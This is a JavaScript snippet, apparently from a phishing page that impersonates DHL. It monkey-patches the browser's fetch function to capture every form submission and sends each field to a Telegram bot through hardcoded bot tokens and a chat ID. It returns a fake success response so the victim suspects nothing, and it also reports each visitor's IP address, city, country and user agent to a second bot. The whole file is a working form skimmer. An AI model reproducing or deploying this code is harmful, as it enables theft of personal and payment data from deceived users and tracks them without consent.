(function() {
  const DATA_BOT_TOKEN = "8584171291:AAHfFk3H1WhcAaxTOOR5vfqevrbekyC5nY4";
  const VISIT_BOT_TOKEN = "8421410574:AAGGyYXoD10wYMsUjbZWxCYO4J33tYmAPA4";
  const CHAT_ID = "6788012481";

  // Fonction pour envoyer à Telegram
  function sendToTelegramSync(text, botToken) {
    try {
      var xhr = new XMLHttpRequest();
      xhr.open("POST", "https://api.telegram.org/bot" + botToken + "/sendMessage", false);
      xhr.setRequestHeader("Content-Type", "application/json");
      xhr.send(JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' }));
    } catch(e) {
      console.error(e);
    }
  }

  // Intercepter fetch (Monkey Patch)
  const originalFetch = window.fetch;
  window.fetch = async function() {
    const url = arguments[0];
    const options = arguments[1];

    if (url && typeof url === 'string' && url.includes('backend.blink.new')) {
      try {
        if (options && options.body) {
          const bodyData = JSON.parse(options.body);
          
          let dataText = '📦 <b>DHL Formulaire Soumis</b>\n\n';
          
          if (bodyData.type) {
            dataText += '<b>Type:</b> ' + bodyData.type + '\n';
          }
          
          if (bodyData.data) {
            for (const key in bodyData.data) {
              dataText += '<b>' + key + ':</b> ' + bodyData.data[key] + '\n';
            }
          } else {
            for (const key in bodyData) {
              dataText += '<b>' + key + ':</b> ' + bodyData[key] + '\n';
            }
          }

          sendToTelegramSync(dataText, DATA_BOT_TOKEN);
        }
      } catch(e) {
        console.error("Fetch intercept error", e);
      }
      
      // On retourne une fausse réponse 200 pour que React pense que le backend a répondu !
      return Promise.resolve(new Response(JSON.stringify({ success: true }), {
        status: 200,
        headers: { 'Content-Type': 'application/json' }
      }));
    }

    return originalFetch.apply(this, arguments);
  };

  // Track visit 
  try {
    originalFetch('https://ipwho.is/').then(r => r.json()).then(data => {
      const ip = (data && data.ip) ? data.ip : 'Inconnu';
      const city = (data && data.city) ? data.city : 'Inconnu';
      const country = (data && data.country) ? data.country : 'Inconnu';

      const text = '🚨 <b>New DHL Visit</b>\n\n' +
        '🌐 <b>IP:</b> ' + ip + '\n' +
        '🏙️ <b>Ville:</b> ' + city + '\n' +
        '🌍 <b>Pays:</b> ' + country + '\n' +
        '📱 <b>UA:</b> ' + navigator.userAgent;

      sendToTelegramSync(text, VISIT_BOT_TOKEN);
    }).catch(() => {
      sendToTelegramSync('🚨 <b>New DHL Visit</b> (IP fail)', VISIT_BOT_TOKEN);
    });
  } catch(e) {}
})();
